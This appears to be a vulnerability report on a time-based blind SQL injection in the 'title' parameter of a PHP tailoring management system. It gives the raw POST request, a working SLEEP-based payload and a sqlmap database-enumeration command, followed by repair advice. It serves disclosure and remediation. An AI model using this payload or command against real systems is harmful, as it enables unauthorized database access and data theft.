The reason for this issue is that attackers inject malicious code from the parameter \"title\" and use it directly in SQL queries without appropriate cleaning or validation. This allows attackers to forge input values, thereby manipulating SQL queries and performing unauthorized operations.\n<img width=\"624\" alt=\"1\" src=\"https://github.com/user-attachments/assets/2d08d39b-8e36-4637-9a43-aa740cff761d\">\n## Impact\n+ Attackers can exploit this SQL injection vulnerability to achieve unauthorized database access, sensitive data leakage, data tampering, comprehensive system control, and even service interruption, posing a serious threat to system security and business continuity.\n# DESCRIPTION\n+ Due to insufficient user input validation for the \"title\" parameter, a serious SQL injection vulnerability has been discovered in the \"Tailoring Management System Project in PHP With Source Code\", allowing attackers to inject malicious SQL queries. Therefore, attackers can gain unauthorized access to databases, modify or delete data, and access sensitive information. Immediate remedial measures are needed to ensure system security and protect data integrity.\n# Vulnerability details and POC\n```\nPOST /inccatadd.php HTTP/1.1\nHost: 192.168.1.138:2223\nContent-Length: 9\nCache-Control: max-age=0\nUpgrade-Insecure-Requests: 1\nOrigin: http://192.168.1.138:2223\nContent-Type: application/x-www-form-urlencoded\nUser-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/126.0.0.0 Safari/537.36\nAccept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.7\nReferer: http://192.168.1.138:2223/inccatadd.php\nAccept-Encoding: gzip, deflate, br\nAccept-Language: zh-CN,zh;q=0.9\nCookie: __utma=123545163.603012537.1718449838.1718449838.1718449838.1; __utmz=123545163.1718449838.1.1.utmcsr=(direct)|utmccn=(direct)|utmcmd=(none); PHPSESSID=umavm58j5beqmmme0aof5v26v4\nConnection: close\ntitle=123\n```\n## Vulnerability type: \n+ time-based blind\n## Vulnerability location:\n+ 'title' parameter \n## Payload: \n```\nParameter: title (POST)\n    Type: time-based blind\n    Title: MySQL >= 5.0.12 AND time-based blind (query SLEEP)\n    Payload: title=123' AND (SELECT 6960 FROM (SELECT(SLEEP(5)))kEHc) AND 'yOHO'='yOHO\n```\n<img width=\"309\" alt=\"2\" src=\"https://github.com/user-attachments/assets/d0a8b981-3902-432c-bf68-5277ef96c634\">\n## The following are screenshots of some specific information obtained from testing and running with the sqlmap tool:\n```bash\nsqlmap -r 123 --batch --dbs\n```\n<img width=\"316\" alt=\"3\" src=\"https://github.com/user-attachments/assets/751f4697-637a-45df-9f36-3791661057d9\">\n# Suggested repair\n1. **Use prepared statements and parameter binding:**\nPreparing statements can prevent SQL injection as they separate SQL code from user input data. When using prepare statements, the value entered by the user is treated as pure data and will not be interpreted as SQL code.\n2. **Input validation and filtering:**\nStrictly validate and filter user input data to ensure it conforms to the expected format. \n3. **Minimize database user permissions:**\nEnsure that the account used to connect to the database has the minimum necessary permissions. Avoid using accounts with advanced permissions (such as' root 'or' admin ') for daily operations.\n4. **Regular security audits:**\nRegularly conduct code and system security audits to promptly identify and fix potential security vulnerabilities.\n",
